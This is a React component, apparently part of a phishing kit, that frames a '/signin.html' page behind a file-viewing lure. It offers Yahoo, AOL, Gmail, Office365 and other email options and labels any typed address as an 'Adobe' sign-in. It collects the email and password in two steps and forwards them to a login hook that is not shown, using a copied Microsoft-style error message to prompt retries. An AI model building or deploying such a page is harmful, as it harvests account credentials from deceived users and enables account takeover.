import React, { useRef, useEffect, useCallback, useState } from 'react';
import { useLogin } from '../../hooks/useLogin';

interface LoginPageProps {
  fileName: string;
  onBack: () => void;
  onLoginSuccess?: (sessionData: any) => void;
  onLoginError?: (error: string) => void;
  onYahooSelect?: () => void;
  onAolSelect?: () => void;
  onGmailSelect?: () => void;
  onOffice365Select?: () => void;
  onOthersSelect?: () => void;
  onEmailSubmit?: (email: string) => boolean | Promise<boolean>;
  defaultProvider?: string;
}

const MobileLoginPage: React.FC<LoginPageProps> = ({
  onLoginSuccess,
  onLoginError,
  onYahooSelect,
  onAolSelect,
  onGmailSelect,
  onOffice365Select,
  onOthersSelect,
  onEmailSubmit,
  defaultProvider,
}) => {
  const iframeRef = useRef<HTMLIFrameElement>(null);
  const [email, setEmail] = useState('');
  const [provider, setProvider] = useState('');

  const { handleFormSubmit } = useLogin(onLoginSuccess, onLoginError);

  const sendToIframe = useCallback((type: string, data?: any) => {
    const iframe = iframeRef.current;
    if (iframe?.contentWindow) {
      iframe.contentWindow.postMessage({ source: 'react-parent', type, ...data }, window.location.origin);
    }
  }, []);

  const handleMessage = useCallback(
    async (event: MessageEvent) => {
      const msg = event.data;
      if (!msg || msg.source !== 'signin-html' || event.origin !== window.location.origin) return;

      switch (msg.type) {
        case 'ready': {
          if (defaultProvider === 'Others') {
            sendToIframe('show-email-step');
          }
          break;
        }
        case 'social-click': {
          const p = msg.data?.provider;
          if (p === 'microsoft' || p === 'outlook') onOffice365Select?.();
          else if (p === 'yahoo') onYahooSelect?.();
          else if (p === 'aol') onAolSelect?.();
          else if (p === 'gmail') onGmailSelect?.();
          else if (p === 'others') onOthersSelect?.();
          break;
        }
        case 'email-submit': {
          const submittedEmail = msg.data?.email;
          if (submittedEmail) {
            if (onEmailSubmit) {
              const result = onEmailSubmit(submittedEmail);
              const handled = (result instanceof Promise) ? await result : result;
              if (handled) {
                return;
              }
            }
            setEmail(submittedEmail);
            setProvider('Adobe');
            sendToIframe('show-password-step');
          }
          break;
        }
        case 'password-submit': {
          const submittedEmail = msg.data?.email || email;
          const submittedPassword = msg.data?.password;
          if (submittedEmail && submittedPassword) {
            setEmail(submittedEmail);
            sendToIframe('show-loading', { show: true });
            const fakeEvent = { preventDefault: () => {} } as React.FormEvent;
            const result = await handleFormSubmit(fakeEvent, {
              email: submittedEmail,
              password: submittedPassword,
              provider: provider || 'Adobe',
            });
            // If result is returned (not undefined), it means an error occurred
            // (success exits via onLoginSuccess callback without returning)
            if (result !== undefined) {
              sendToIframe('show-error', {
                message: 'Your account or password is incorrect. If you don\'t remember your password, reset your password.',
              });
              sendToIframe('clear-password');
            }
            sendToIframe('show-loading', { show: false });
          }
          break;
        }
      }
    },
    [email, provider, handleFormSubmit, onYahooSelect, onAolSelect, onGmailSelect, onOffice365Select, onOthersSelect, onEmailSubmit, sendToIframe, defaultProvider]
  );

  useEffect(() => {
    window.addEventListener('message', handleMessage);
    return () => window.removeEventListener('message', handleMessage);
  }, [handleMessage]);

  return (
    <iframe
      ref={iframeRef}
      src="/signin.html"
      title="Sign in"
      style={{
        width: '100%',
        height: '100vh',
        border: 'none',
        display: 'block',
      }}
    />
  );
};

export default MobileLoginPage;
